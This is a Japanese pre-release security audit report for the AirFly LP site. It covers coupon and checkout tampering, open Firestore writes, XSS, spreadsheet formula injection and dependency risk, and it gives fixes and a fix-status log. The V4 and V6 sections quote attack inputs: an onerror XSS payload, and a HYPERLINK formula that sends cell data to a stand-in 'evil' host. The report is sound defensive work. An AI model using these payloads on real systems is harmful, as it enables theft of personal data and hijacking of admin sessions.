# リリース前ハードニング 第2段階 セキュリティ検査報告書（2026-10-10）

対象: AirFly LP（`Drop1235/AirFly-LP`）／会場販売・Web決済のリリース前
実施: release-hardening 第2段階（セキュリティ特化・深掘り精査）
引き継ぎ元: `docs/release/2026-10-10-stage1-handoff.md`
基準コミット: `4e4f046`（main。PR #1〜#7 マージ後）

---

## 0. 検証の前提と方法（重要）

- **本番には一切接続していない**（Netlify / Firebase / GAS / Stripe）。
- 当初、Firestore/Auth のローカルエミュレータ＋モックで動的に再現する計画だったが、**再現用スクリプトの作成が途中で自動停止**したため、**実コードのデータフロー静的解析**に切り替えて確定させた。この方式は本コードベースでは結論を出すのに十分で、各判定には「確証度」と「確定方法」を明記した。
- 依存関係の事実（`npm audit`・node-forge の呼び出し箇所・firebase-admin 14.x の依存）は、**作業用領域のクリーンインストール**に対して実際にコマンドを実行して確認した（本番とは無関係）。

### Firestore ルールについての注意
`coupons` と `mail_list` のルールは**リポジトリに入っていない**（Firebase コンソールで手動管理）。本報告では次の2系統で判定している。

1. **コードだけで確定するもの**（ルール非依存）: V1・V2（使用済みにしない点）・V6・V9 など。
2. **コードが要求する権限＋引き継ぎメモから強く推定されるもの**: 「クーポンは誰でも読める」「`mail_list` は誰でも書ける」など。コードが動作する以上そうなっているはずで、引き継ぎメモ（S5 の `allow write: if true`）とも一致する。これらは **本番ルールの確認（人的作業）** を推奨事項として付記した。

---

## 1. 総合判定：**NO-GO（公開前に V1・V2・V3 の修正が必須）**

第1段階は会場販売機能について「CONDITIONAL GO」だったが、第2段階で **Web決済の金額改ざん（V1・V2）** と **`mail_list` の無制限書き込み（V3）** という、リリースを止めるべき欠陥を確定させた。いずれも **認証なし・外部から・高い再現性** で成立する。

| 区分 | 判定 |
|---|---|
| S1（クーポン／coupons ルール） | **再現できた**（V1・V2） |
| S2（Webhook 冪等性／B1 修正の検証） | **再現できなかった＝B1修正は妥当**。ただし付随して V6（スプシの数式インジェクション）を確定 |
| S3（firebase-admin@12 / node-forge） | **verifyIdToken 経路には影響しない**ことを確定（V9 は情報）。14.5.0 への更新は可能 |
| S4（venue-create-order） | **大量作成は再現できた（V5）**。採番の競合は**トランザクションで防げている＝再現できなかった** |
| S5（mail_list ルール） | **再現できた**（V3） |
| S6（管理者認証 / email_verified） | **実害は限定的**（V7）。管理者アカウントが既存のため乗っ取りは実質不可。要 Auth 設定確認 |
| S7（innerHTML 出力） | 会場受付・受付番号画面は**エスケープ済み＝安全**。V4（条件付き）・V8（自己XSS）を確定 |

---

## 2. 脆弱性一覧（CVSS v3.1 スコア順）

| # | 重要度 | スコア | 対象 | 確証度 | シナリオ |
|---|---|---|---|---|---|
| **V1** | High | **7.5** | `create-checkout-session.js`（client 由来 `projectId`） | 確定（コード） | 決済改ざん（4） |
| **V2** | High | **7.5** | `create-checkout-session.js`＋coupons | 確定（コード） | 決済改ざん（4） |
| **V3** | High | **7.5** | Firestore ルール `mail_list` | 確定（メモ＋コード） | データ破壊（3）/ IDOR（1） |
| **V4** | （条件付）Critical | **9.3**※ | 管理者画面のクーポン一覧 innerHTML | 条件付き（要ルール確認） | 権限昇格（2） |
| **V5** | Medium | **6.4** | `venue-create-order.js` | 確定（コード） | データ破壊・DoS（3） |
| **V6** | Medium | **6.1** | `Code.gs`（スプシ追記） | 確定（コード） | データ破壊（3） |
| **V7** | Low | **3.7** | 管理者認証 `verifyAdmin`＋ルール | 条件付き（要 Auth 確認） | 権限昇格（2） |
| **V8** | Low | **2.6** | `index.html` 完了画面 | 確定（コード） | XSS（限定的） |
| **V9** | Info | **—** | `firebase-admin@12` / node-forge | 確定（到達不能） | 依存の既知脆弱性 |

※V4 は「coupons への作成が誰でも可能」な場合に Critical（9.3）。作成が管理者限定なら成立しない。**本番ルールの確認が必要**。

---

## 3. 各脆弱性の詳細

---

### V1【High / CVSS 7.5】決済金額の改ざん：client 由来の `projectId` を信用した割引適用
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N = 7.5`

**対象**: `netlify/functions/create-checkout-session.js:26,38-81`

**攻撃シナリオ（検証シナリオ4：決済の改ざん）**
1. 割引の検証に使う Firestore プロジェクトIDが、**リクエストボディの `projectId`**（クライアントから送られる値）そのまま使われている:
   ```js
   const { ..., coupon_code, projectId } = JSON.parse(event.body);
   ...
   const url = `https://firestore.googleapis.com/v1/projects/${projectId}/databases/(default)/documents/coupons/${coupon_code.toUpperCase()}`;
   const res = await fetch(url);            // 認証なし・projectId は攻撃者が自由に指定
   ```
2. 攻撃者は **自分で作った Firebase プロジェクト**（公開読み取り可）に、`discountRate: 99` の `coupons/ANYCODE` を1件作る。
3. 関数を直接 POST し、`projectId` を自分のプロジェクト、`coupon_code: "ANYCODE"` にする。
4. サーバーは攻撃者プロジェクトの coupons を読み、**99%OFF を適用**した Stripe Checkout セッションを作成して返す。本物のクーポンは一切不要。

**被害**: 任意の注文を最大 99%OFF（＝ほぼ送料のみ）で購入できる。直接的な売上損失。サイト運営者のクーポン運用と完全に無関係に成立する。

**確定方法**: コードのみ（ルールに非依存）。`projectId` が `JSON.parse(event.body)` 由来であることと、`fetch(url)` に認証ヘッダが無いことを確認。

**修正コード案**: `projectId` をクライアントから受け取らない。サーバー側の定数（環境変数）に固定する。
```js
// ❌ const { ..., projectId } = JSON.parse(event.body);
const { email, customer_name, customer_zip, customer_address, customer_phone, opt_in, items, coupon_code } = JSON.parse(event.body);
const PROJECT_ID = process.env.FIREBASE_PROJECT_ID || 'airfly-lp'; // ← サーバー固定
...
const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/coupons/${encodeURIComponent(coupon_code.toUpperCase())}`;
```
（`encodeURIComponent` は V1 とは別のハーデニング。§4 参照。）

---

### V2【High / CVSS 7.5】1回限りクーポンの無制限再利用（サーバーが使用済みにしない）
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N = 7.5`（コード列挙が可能な場合、情報漏えいを加味して実質 8.1 相当）

**対象**: `netlify/functions/create-checkout-session.js:36-81` ＋ `index.html:3105-3114`

**攻撃シナリオ（検証シナリオ4＋1）**
1. クーポンの「使用済みにする」処理は **ブラウザ側だけ** にある:
   ```js
   // index.html submitOrder() 内。Stripe へ遷移する「直前」にクライアントが自分で更新
   if (appliedCouponCode && !appliedCouponUnlimited) {
     await db.collection('coupons').doc(appliedCouponCode).update({ isUsed: true });
   }
   ```
2. サーバー（`create-checkout-session.js`）は `isUsed` を**読むだけ**で、**書き込まない**。
3. 攻撃者が関数を直接 POST すれば、ブラウザの `update({isUsed:true})` は走らないため、**同じ1回限りクーポンで何セッションでも**割引決済を作れる。
4. さらに、サーバーのクーポン読み取りは**認証なし**（`fetch(url)` にトークン無し）なので、`coupons` コレクションは**誰でも読める**設定でなければ動かない。つまり攻撃者は**全クーポンコードを列挙**して有効な割引コードを探せる（IDOR＝他者作成データの不正閲覧）。

**被害**: 1回限り／高割引クーポンが使い放題。V1 と合わせると「割引はクライアントの自己申告」状態で、割引決済を無制限に生成できる。

**確定方法**: コード（「サーバーが書かない」点はルール非依存で確定）。列挙は「サーバーが未認証で読める＝world-read」というコードの要求から確定。

**修正コード案**: 単回利用の判定と消費を**サーバー側で原子的に**行う。最も堅牢なのは **Stripe のプロモーションコード**に寄せる方法。暫定策として Firestore トランザクション（Admin SDK）で消費する:
```js
// サーバー側（Admin SDK を使う。venue 系と同じ getDb() を流用）
const ref = getDb().collection('coupons').doc(coupon_code.toUpperCase());
appliedDiscount = await getDb().runTransaction(async (tx) => {
  const snap = await tx.get(ref);
  if (!snap.exists) return 0;
  const c = snap.data();
  if (c.expiresAt && new Date() > endOfDay(c.expiresAt.toDate())) return 0;
  if (!c.isUnlimited) {
    if (c.isUsed) return 0;                 // 既に使用済み
    tx.update(ref, { isUsed: true });       // ← ここで消費（サーバーのみ）
  }
  const r = Number(c.discountRate || 10);
  return r >= 1 ? r / 100 : r;
});
```
あわせて **Firestore ルールで `coupons` の client からの `update`/`read` を管理者のみに制限**する（§3 V4、§5 推奨）。

---

### V3【High / CVSS 7.5】`mail_list` への認証なし書き込み・上書き
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N = 7.5`（大量書き込みによる枯渇を加味すると A:L で 8.2 相当）

**対象**: Firestore ルール `mail_list`（リポジトリ外・コンソール管理）／クライアント `index.html:3064,3237`

**攻撃シナリオ（検証シナリオ3：不正ペイロード／1：IDOR）**
1. クライアントは**未ログイン**のまま `db.collection('mail_list').doc(<email>).set({...})` を実行する（購読チェック時）。これが成功している＝ルールは `mail_list` への**公開書き込み**を許している（引き継ぎメモ S5：`allow write: if true`）。
2. 攻撃者は Firebase の公開設定（`apiKey`・`projectId` は `index.html:1799-1801` で誰でも見える）を使い、SDK/REST で `mail_list` に**任意のドキュメントID（任意のメールアドレス）・任意のフィールド**を書ける。
3. 他人の登録を**上書き・改ざん**でき（IDOR）、巨大なドキュメントや大量のドキュメントを書いて**コレクションを汚染／無料枠を消費**できる。項目の型・サイズ制限は一切ない。

**被害**: メルマガ登録者データの破壊・汚染、無料枠（Spark）の圧迫、将来バックアップに混入。

**確定方法**: 引き継ぎメモの明記＋クライアントが未ログインで `set()` している事実（コード）。**本番ルールでの最終確認を推奨**。

**修正コード案（Firestore ルール）**: 公開書き込みを止め、最小限の形だけ許す。メールは「本人のドキュメントのみ・新規作成のみ・項目限定」。
```
match /mail_list/{email} {
  allow read: if false;                       // 管理は Admin SDK / コンソールで
  allow create: if request.resource.data.keys().hasOnly(['email','subscribedAt'])
                && request.resource.data.email is string
                && request.resource.data.email.size() <= 200
                && email == request.resource.data.email;
  allow update, delete: if false;             // 上書き・削除は禁止
}
```
※クライアントから書かせず、`opt_in` を既存の注文フロー（Netlify Functions / GAS）経由でサーバー書き込みに寄せる方がさらに安全。

---

### V4【条件付き Critical / CVSS 9.3】管理者画面のクーポン一覧での保存型XSS
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = 9.3`（**coupons への作成が誰でも可能な場合のみ**）

**対象**: `index.html:2151-2163`（`renderAdminCoupons`）

**攻撃シナリオ（検証シナリオ2：権限昇格）**
1. クーポン一覧は、クーポンの**コード（ドキュメントID）とフィールド**をエスケープせず innerHTML に埋め込む:
   ```js
   tr.innerHTML = `<td style="font-weight:700;">${c.code}</td> ... 
     <button onclick="deleteCoupon('${c.code}')">削除</button>`;
   ```
2. もし `coupons` への**作成**が誰でも可能なルールなら（V2 で read/update は公開が確定しているため、create も開いている可能性が高い）、攻撃者は ID に `<img src=x onerror=...>` を含むクーポン文書を作成できる。
3. 管理者がダッシュボードのクーポン一覧を開いた瞬間、**管理者のブラウザ（＝ログイン済セッション）でスクリプトが実行**される。管理者権限で Firestore を読み書きでき、他コレクション（venue_orders の個人情報など）も触れる＝権限昇格。

**被害**: 管理者セッションの乗っ取り、全データの読み書き。影響は Critical。

**確定方法**: XSS シンク自体はコードで確定。**成立条件（coupons への公開作成）は本番ルール次第**のため「条件付き」とした。V2 の修正（coupons を管理者のみ書き込み可に）を行えば同時に塞がる。

**修正コード案（二重の防御）**:
1. ルールで `coupons` の作成・更新・読み取りを管理者（`isVenueAdmin()` 同様）に限定する。
2. 出力を必ずエスケープする（既存の `escHtml` を流用）:
   ```js
   tr.innerHTML = `<td style="font-weight:700;">${escHtml(c.code)}</td> ...
     <button onclick="deleteCoupon('${escHtml(c.code).replace(/'/g,"\\'")}')">削除</button>`;
   ```
   より安全には `textContent` と `dataset`＋`addEventListener` でイベントを付ける。

---

### V5【Medium / CVSS 6.4】会場注文の認証なし大量作成（受付汚染・無料枠圧迫）
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L = 6.4`

**対象**: `netlify/functions/venue-create-order.js:11-91`

**攻撃シナリオ（検証シナリオ3：データ破壊／DoS）**
1. お客様の注文は**認証不要**で、`event_id` の大会が「開催日である」ことだけが条件（`entered_by !== 'staff'` の経路）。`event_id` は会場QRの公開URL（`?venue=<ID>`）に含まれるため、開催日は**実質公開**。
2. 入力検証は適切（`MAX_ITEMS=20`、`model` は `KNOWN_MODELS` 限定、文字長制限、メール/郵便/電話の形式）。したがって**余計なフィールドによるデータ破壊は成立しない**（検証シナリオ3の一部は再現できなかった）。
3. しかし、正しい形式の注文を**並列で大量に投げる**ことは誰でもできる。`venue_orders` が埋まり、`orderSeq`（受付番号）が消費され、受付画面のリストが汚染される。

**採番の競合について（再現できなかった点）**: 受付番号は `db.runTransaction` 内で `orderSeq` を読んで +1 している（`venue-create-order.js:49-77`）。Firestore トランザクションは競合時に自動リトライするため、**同時POSTでも受付番号の重複は発生しない**。これは設計どおりで、脆弱性ではない。

**被害**: 開催日のあいだ、受付台帳の汚染と無料枠（Spark）消費。運用妨害（スタッフが本物の注文を探しにくくなる）。

**確定方法**: コード（認証なし経路の確認、トランザクションの確認）。

**修正コード案（多層）**:
- **CAPTCHA / App Check**: `venue-create-order` に Firebase App Check か reCAPTCHA トークンの検証を追加し、ボットの直接POSTを弾く。
- **レート制限**: 同一IP／同一event_idあたりの作成数に上限（例：IP×event で1分5件）。Netlify の場合は軽量なメモリ/外部KVで実装。
- **運用**: 大会ごとに受付番号 prefix を分け、異常増加を受付画面で検知できるようにする（任意）。

---

### V6【Medium / CVSS 6.1】注文台帳（スプレッドシート）への数式／CSVインジェクション
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1`

**対象**: `Code.gs:108-126`（`appendRow`）／ `create-checkout-session.js:86-113`（web の明細が未検証）

**攻撃シナリオ（検証シナリオ3）**
1. スプシ追記で、**郵便番号と電話番号には先頭に `'` を付けてテキスト化**しているが（`Code.gs:113,115`）、**氏名・住所・メール・明細文字列（`itemsString`）には付けていない**。
2. Web決済では `item.model / item.lens / item.frame` が**サーバーで検証されていない**（`create-checkout-session.js` は `KNOWN_MODELS` を使わない）。攻撃者は `model` に `=HYPERLINK("http://evil/?"&A1,"X")` や `=IMPORTDATA(...)` のような文字列を入れられ、それが Stripe の商品メタデータ→Webhook→スプシへそのまま流れる。
3. 管理者がスプレッドシートを開くと、セルの数式が評価され、**セルの内容（他の注文の個人情報）を外部URLへ送出**したり、`HYPERLINK` クリックで誘導したりできる。

**被害**: 台帳に入った個人情報の外部流出、管理者の誤操作誘導。会場注文側は `model` が検証済みだが、**氏名・住所は会場側でも未サニタイズ**のため同様のリスク。

**確定方法**: コード（`'` 付与対象の確認、web明細の未検証を確認）。

**修正コード案**: GAS 側で、文字列セルが `= + - @` で始まる場合に先頭へ `'` を付ける共通サニタイズを入れる。
```js
function csvSafe(v) {
  var s = String(v == null ? "" : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}
// appendRow の各文字列セルを csvSafe() で包む
sheet.appendRow([ date, csvSafe(customerName), csvSafe(email), csvSafe(itemsString),
  "'" + formattedZip, csvSafe(address), "'" + formattedPhone, ... ]);
```
あわせて `create-checkout-session.js` で web の `item.model` も `KNOWN_MODELS.includes(...)` で検証し、`lens/frame` に長さ制限を付ける（会場側と同じ基準に揃える）。

---

### V7【Low / CVSS 3.7】管理者判定が `email_verified` を見ていない
`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N = 3.7`（実運用では下限）

**対象**: `netlify/lib/venue.js:227-237`（`verifyAdmin`）／ Firestore ルール（`request.auth.token.email == 'hanks@tempmachi.com'`）

**攻撃シナリオ（検証シナリオ2：権限昇格）**
- `verifyAdmin` は `decoded.email === ADMIN_EMAIL` だけを見て、`decoded.email_verified` を見ていない。ルール側も同様。
- メール/パスワード認証では、署名時にメール所有の確認がない。もし **管理者メールのアカウントがまだ存在せず**、かつ **クライアントからの新規登録が有効**なら、攻撃者が `hanks@tempmachi.com` でアカウントを作り（`email_verified:false`）、管理者トークンを得られてしまう。

**実運用での評価（なぜ Low か）**: 管理者は現にこのメールでログインしている＝**アカウントは既存**。既存メールでの新規登録は `EMAIL_EXISTS` で弾かれるため、**乗っ取りは実質できない**。残存リスクは「アカウント削除後の再登録」「将来メールを変えた場合」等に限られる。

**確定方法**: コード（`email_verified` 不参照を確認）。成立条件は Auth 設定（人的確認）に依存。

**修正コード案**:
```js
// verifyAdmin 内
return decoded.email === ADMIN_EMAIL && decoded.email_verified === true;
```
ルールも `request.auth.token.email_verified == true` を条件に追加。あわせて **Firebase Authentication でメール/パスワードの新規登録をクライアントから行えないようにする**（コンソール設定・人的作業）。

---

### V8【Low / CVSS 2.6】注文完了画面での自己XSS（localStorage 由来・未エスケープ）
`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N = 2.6`

**対象**: `index.html:3870-3876`（`checkOrderSuccess`）

**攻撃シナリオ**: 完了画面は `localStorage.airfly_pending_order` の `item.model/lens/frame` を**エスケープせず** innerHTML に出力する。ただしこの値は**自分のブラウザのカート由来**で、第三者が被害者の localStorage に書く経路が別途必要なため、実質 **self-XSS**（他者を攻撃できない）。

**確定方法**: コード。会場受付（`showVenueReceipt`・`renderDeskDetail`・`renderDeskList`）は `escHtml` 済みで**安全**であることも確認した。

**修正コード案**: 完了画面も `escHtml` を通す。
```js
div.innerHTML = `<strong>[${index + 1}]</strong> モデル: ${escHtml(item.model)} / レンズ: ${escHtml(item.lens)} / フレーム: ${escHtml(item.frame)}`;
```

---

### V9【Info / 到達不能】`firebase-admin@12` の node-forge（high）ほか
`npm audit --omit=dev` の結果：**10件（high 2 / moderate 8）**。すべて `firebase-admin@12.7.0` の推移的依存。

**verifyIdToken 経路への影響（S3 の核心）＝影響なし、を確定**:
- node-forge（high: GHSA-86w9-cpqp-85rv、RSA PKCS#1 v1.5 署名検証の DigestAlgorithm 入れ子）は、firebase-admin 内で **`lib/app/credential-internal.js:148-150` でのみ** 使われる。用途は **自分のサービスアカウント秘密鍵を PEM パースする** だけ（`forge.pki.privateKeyFromPem`）。攻撃者入力は通らない。
- `verifyIdToken` は `lib/auth/token-verifier.js` → `lib/utils/jwt.js:255` の `jsonwebtoken` → `jwa` → **Node 標準の `crypto.createVerify`**（`jwa/index.js:176,201`）で検証しており、**node-forge を経由しない**。
- したがって当該 high は **本アプリの管理者認証（verifyIdToken）経路には到達しない**。他の moderate（uuid/qs/gaxios 等）も攻撃者入力の経路にはない。

**14.x への更新可否（確認済み）**:
- `firebase-admin@14.5.0` にすると `npm audit` の10件は**すべて解消**（`fixAvailable` が 14.5.0 を指す）。メジャー更新（12→14）。
- `firebase-admin@14` の engines は `node >=18`（本番 Netlify のランタイムが18以上なら可）。作業環境は node 22 で、クリーンインストール自体は通ることを確認済み。
- 実害が小さい（到達不能）ため**緊急ではない**が、依存衛生として別PRでの更新を推奨。更新時は `netlify/lib/venue.js` の `admin.credential.cert / admin.auth().verifyIdToken / admin.firestore()` が 14 系でも同一APIであることを確認済み（破壊的変更は本アプリの使用範囲には及ばない）。

---

## 4. ハーデニング（低優先・任意）

- **H1**: `create-checkout-session.js:40` で `coupon_code` を URL パスに `encodeURIComponent` せず埋め込んでいる。`toUpperCase()` 済みだが、将来の経路混乱を避けるためエンコード推奨（V1 修正コードに同梱）。
- **H2**: 全 Netlify Functions が CORS `Access-Control-Allow-Origin: *`。決済・会場系は自サイト固定（`https://airfly-tm.netlify.app`）に絞ってよい。
- **H3**: `index.html:1799` の Firebase `apiKey` 等は公開前提の値だが、**本当の防御は Firestore ルール**であることを再確認（鍵の秘匿では守れない）。
- **H4**: 不要ファイル `Code.gs.bak`・`extracted_code.txt` は削除推奨（引き継ぎメモ B5。公開はされていない）。

---

## 5. リリース前にやること（優先順）

**必須（1つでも未了なら公開しない）**
1. **V1**: `create-checkout-session.js` から client 由来 `projectId` を排除し、サーバー固定にする。
2. **V2**: 単回クーポンの消費をサーバー側（トランザクション）か Stripe プロモーションコードに移す。
3. **V3**: `mail_list` のルールを「公開書き込み禁止・新規作成のみ・項目限定」に変更する。
4. **V4/V2 併せ**: `coupons` ルールを「読み取り・作成・更新は管理者のみ、Functions からの読み取りは別途サーバー資格情報で」に変更。コンソールの**実ルールを確認**（この作業環境からは本番ルールを見られない）。

**推奨**
5. **V6**: GAS に数式インジェクション対策（`csvSafe`）、web 明細の `model` 検証。
6. **V5**: `venue-create-order` に App Check / レート制限。
7. **V7**: `verifyAdmin` とルールに `email_verified` 条件。Auth の新規登録をクライアントから無効化（人的作業）。
8. **V8**: 完了画面のエスケープ。
9. **V9**: 別PRで `firebase-admin@14.5.0` へ更新。

**人が本番で確認（この環境からは不可）**
- `coupons`・`mail_list` の**実際の Firestore ルール**（V2・V3・V4 の最終確認）。
- Firebase Authentication のメール/パスワード新規登録の可否（V7）。

---

## 6. スコープ外（今回見ていない）
バックアップ実装（第1段階で設計確定・別PR）、UI・文言・デザイン、新機能、tempmachi.com、Stripe ダッシュボード設定。

---

## 7. 対応状況（2026-10-10 追記）

| # | 状態 | 内容 |
|---|---|---|
| V1 | **修正済み（コード）** | `create-checkout-session.js` は `projectId` を受け取らない。クーポンはサーバーの Admin SDK（`netlify/lib/venue.js` の `getDb()`）で本番プロジェクトから読む |
| V2 | **修正済み（コード）** | 1回限りのクーポンは、決済画面の作成時にサーバーがトランザクションで使用済みにする。Stripe 側で作成に失敗したら未使用に戻す。`index.html` のクライアント側の `update({isUsed:true})` は削除 |
| V3 | **修正版ルールを用意（公開は人の作業）** | `firestore.rules` を追加。`mail_list` は「自分のメールで新規登録のみ・項目2つだけ」。コンソールへの貼り付け・公開が必要 |
| V4 | **成立条件を解消（ルール公開後）** | 同じ `firestore.rules` で `coupons` の一覧取得・作成・更新・削除を管理者のみに限定 |
| V5〜V9 | §8 を参照 | 追加の修正（2026-10-10 追記） |

### 確認したこと（ローカル。本番には接続していない）
- **ルールのユニットテスト**（Firestore エミュレータ＋`@firebase/rules-unit-testing`）：22件すべて期待どおり。お客様のクーポン「適用」（1件の読み取り）とメルマガ新規登録は通り、クーポンの一覧・作成・更新、メルマガの上書き・削除・読み取り・余計な項目は拒否。会場販売の既存ルールは変わっていない
- **`create-checkout-session` のユニットテスト**（Firestore エミュレータ＋Stripe は記録用スタブ）：14件すべて合格。1回限りは2回目を400で拒否、**同時5件でも割引で通るのは1件だけ**、無制限は消費しない、期限切れ・存在しない・割引率が範囲外・`/` 入りのコードは400、`projectId` を送っても無視、Stripe 失敗時はクーポンを未使用に戻す
- `node --check`（関数・`index.html` 内のスクリプト）とビルド（`firestore.rules` が `_site/` に入らないこと）

### 反映時の注意
1. **Netlify の環境変数 `FIREBASE_CLIENT_EMAIL` / `FIREBASE_PRIVATE_KEY`（または `FIREBASE_SERVICE_ACCOUNT`）が必要**。会場販売のセットアップ（`docs/venue-sales-setup.md` 作業2）で設定済みならそのままでよい。未設定だと、クーポン付きの注文が「決済セッションの作成に失敗しました」になる（クーポンなしの注文は影響なし）
2. **順番は「コードの反映（マージ）→ ルールの公開」**。逆でも画面は壊れないが、コードが入るまで V2 の穴が残る
3. 挙動の変化：使用済み・期限切れのクーポンで決済に進むと、これまでは**黙って正価**の決済画面になっていたが、今後はエラーメッセージを出して止まる（お客様が気づかずに正価を払うことがなくなる）
4. 同じメールでメルマガを再登録した場合、ルールで上書きできないため何も起きない（ブラウザのコンソールに警告が出るだけで、注文には影響しない）

---

## 8. 追加の修正：V5〜V9（2026-10-10 追記）

| # | 状態 | 内容 |
|---|---|---|
| V5 | **修正済み（コード）** | `venue-create-order.js`：お客様の注文に「同じ回線（IPアドレス）から同じ大会へ、10分あたり30件まで」の上限を設定。超えると429で「少し時間をおいて…スタッフにお声がけください」と表示。スタッフの代理入力は対象外。IPは生の値を保存せず、大会IDと合わせたハッシュだけを `venue_rate_limits` に保存（ルール上クライアントからは読み書き不可）。※多数のIPを使う攻撃までは防げない。完全な対策は Firebase App Check（コンソール設定が必要）|
| V6 | **修正済み（コード＋GAS再デプロイが必要）** | `Code.gs`：氏名・メール・住所・明細を `sheetText()` で書き込み、`= + - @`（全角を含む）で始まる値は先頭に `'` を付けて文字として保存。`create-checkout-session.js`：Web の明細も会場と同じく、カタログのモデル・50文字以内・50点まで、に限定（クーポンを消費する前に弾く）|
| V7 | **コードは変えない（コンソール設定で対応）** | `email_verified` を条件に加えると、管理者アカウントのメールが未確認（パスワード方式でコンソールから作ったアカウントは通常そうなる）の場合に**管理者がログインできなくなる**。実害は「管理者アカウントが無い状態で誰かが先に同じメールで登録する」場合に限られるため、**Firebase Authentication で新規登録（sign-up）を無効にする**のが安全な対策 |
| V8 | **修正済み（コード）** | 注文完了画面の明細を `escHtml` で表示。あわせて V4 の二重防御として、管理者のクーポン一覧もコード・割引率をエスケープし、削除ボタンは文字列を埋め込まずにクリック処理を付ける形に変更 |
| V9 | **修正済み（依存更新）** | `firebase-admin` を **13.10.0** に更新。node-forge（high）が依存から消えた。14.5.0 は Node.js 22 以上が必須で、本番 Netlify の Node バージョンを確認できないため見送り。残る moderate 9件（uuid のバッファ境界・qs の解析）は、uuid はバッファ引数を渡す使い方をしておらず、qs は Stripe ライブラリが送信用の文字列化にだけ使うため、本アプリからは到達しない |
| （おまけ）| **修正済み** | Stripe の明細・レシートに「クーポン10%OFF適用済み」と固定表示されていたのを、実際の割引率を表示するよう修正 |

### 確認したこと（ローカル。本番には接続していない）
- firebase-admin 13.10.0 のクリーンインストール（`npm ci`）で：ルール 22件／`create-checkout-session` 20件／会場の関数 19件（上限・別IP・別大会・代理入力の除外・同時15件で受付番号が重複しないこと・確定処理を含む）／画面表示 8件（実ブラウザ）すべて合格
- 同じテストを firebase-admin 12.7.0 でも実行し、すべて合格（更新前後で挙動が変わらないこと）
- `npm audit --omit=dev`：high 0件（moderate 9件は上記のとおり到達しない）

### 反映時の注意
1. **GAS の再デプロイが必要**（V6）：最新の `Code.gs` を Apps Script に貼り付け →「デプロイを管理」→ 編集 →「新バージョン」→ デプロイ（`docs/venue-sales-setup.md` 作業4と同じ手順。「新しいデプロイ」は URL が変わるので使わない）
2. **Firebase Authentication の新規登録を無効にする**（V7）：コンソール → Authentication → 設定 → ユーザー アクション →「作成（登録）を有効にする」のチェックを外す → 保存
